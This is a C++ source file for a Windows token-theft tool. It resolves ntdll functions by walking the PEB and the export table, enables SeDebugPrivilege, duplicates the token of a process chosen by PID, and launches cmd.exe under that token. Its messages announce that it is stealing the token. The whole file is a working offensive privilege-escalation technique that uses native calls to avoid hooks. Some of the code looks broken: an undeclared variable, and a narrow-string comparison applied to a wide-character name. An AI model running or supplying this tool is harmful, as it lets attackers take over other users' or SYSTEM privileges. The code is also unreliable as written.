#include "structs.h"
#include <iostream>

PVOID GetNTDLLFunc(const char* func) {

    PVOID PebBase = (PVOID)__readgsqword(0x60); // <-- peb addr on x64 bit

    PPEB b = (PPEB)PebBase;

    PEB_LDR_DATA* ldr = b->Ldr;
    LIST_ENTRY* Head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pEntry = Head->Flink;

    PVOID dllBase = NULL;

    wchar_t sModuleName[] = { 'n','t','d','l','l','.','d','l','l','\0' };

    while (pEntry != Head) {

        pEntry = pEntry->Flink;

        PLDR_DATA_TABLE_ENTRY2 data = (PLDR_DATA_TABLE_ENTRY2)((BYTE*)pEntry - sizeof(LIST_ENTRY));

        if (_stricmp((const char*)data->BaseDllName.Buffer, (const char*)sModuleName) == 0) {
            dllBase = data->DllBase;
            break;
        }
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + dos->e_lfanew);

    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + expRVA);

    PWORD addrOrds = (PWORD)((DWORD_PTR)dllBase + expDir->AddressOfNameOrdinals);
    PDWORD addrFunctions = (PDWORD)((DWORD_PTR)dllBase + expDir->AddressOfFunctions);
    PDWORD addrNames = (PDWORD)((DWORD_PTR)dllBase + expDir->AddressOfNames);

    DWORD_PTR funcRVA = 0;

    for (DWORD i = 0; i < expDir->NumberOfFunctions; i++) {

        DWORD_PTR name = (DWORD_PTR)dllBase + addrNames[i];
        char* functionName = (char*)name;

        if (strcmp(functionName, func) == 0) {
            funcAddr = (PDWORD)((DWORD_PTR)dllBase + (DWORD_PTR)addrFunctions[addrOrds[i]]);
            break;
        }
    }

    if (funcAddr == NULL) {
        return FALSE;
    }

    return funcAddr;
    
}

// Inspired by ReactOS
BOOL WINAPI DuplicateTokenExNative(

    IN HANDLE ExistingTokenHandle,
    IN DWORD dwDesiredAccess,
    IN LPSECURITY_ATTRIBUTES lpTokenAttributes OPTIONAL,
    IN SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE DuplicateTokenHandle) {

    OBJECT_ATTRIBUTES ObjectAttributes;
    NTSTATUS Status;
    SECURITY_QUALITY_OF_SERVICE Sqos;

    Sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    Sqos.ImpersonationLevel = ImpersonationLevel;
    Sqos.ContextTrackingMode = 0;
    Sqos.EffectiveOnly = FALSE;

    if (lpTokenAttributes != NULL) {

        InitializeObjectAttributes(&ObjectAttributes, NULL, lpTokenAttributes->bInheritHandle ? OBJ_INHERIT : 0, NULL, lpTokenAttributes->lpSecurityDescriptor);

    }
    else {

        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    }

    ObjectAttributes.SecurityQualityOfService = &Sqos;

    _NtDuplicateToken NtDuplicateToken = (_NtDuplicateToken)GetNTDLLFunc("NtDuplicateToken");
    _RtlNtStatusToDosError RtlNtStatusToDosError = (_RtlNtStatusToDosError)GetNTDLLFunc("RtlNtStatusToDosError");

    Status = NtDuplicateToken(ExistingTokenHandle, dwDesiredAccess, &ObjectAttributes, FALSE, TokenType, DuplicateTokenHandle);

    if (!NT_SUCCESS(Status))
    {
        printf("NtDuplicateToken failed: Status %08x\n", Status);
        SetLastError(RtlNtStatusToDosError(Status));
        return -1;
    }

    return TRUE;


}

int main(int argc, char* argv[]) {

    STARTUPINFO si{};
    PROCESS_INFORMATION pi{};
    DWORD pid = atoi(argv[1]);
    BOOL bRet = FALSE;
    HANDLE tokenHandle, dupToken, hToken, procHandle = NULL;
    LUID luid{};

    if (OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }

    wchar_t startProcessProgram[] = L"C:\\Windows\\System32\\cmd.exe";
    si.cb = sizeof(STARTUPINFO);


    procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

    printf("[!] Attempting to steal token of PID: %d\n", pid);

    if (!OpenProcessToken(procHandle, (TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY), &tokenHandle)) {

        printf("[-] OpenProcessToken error: %d\n", GetLastError());
        return -1;

    }

    if (!DuplicateTokenExNative(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

        printf("[-] DuplicateTokenExNative error: %d\n", GetLastError());
        return -1;

    }

    if (!CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE, NULL, startProcessProgram, 0, NULL, NULL, &si, &pi)) { 

        printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
        return -1;

    }

    printf("[+] Token of PID %d impersonated!\n", pid);
    return 0;
}
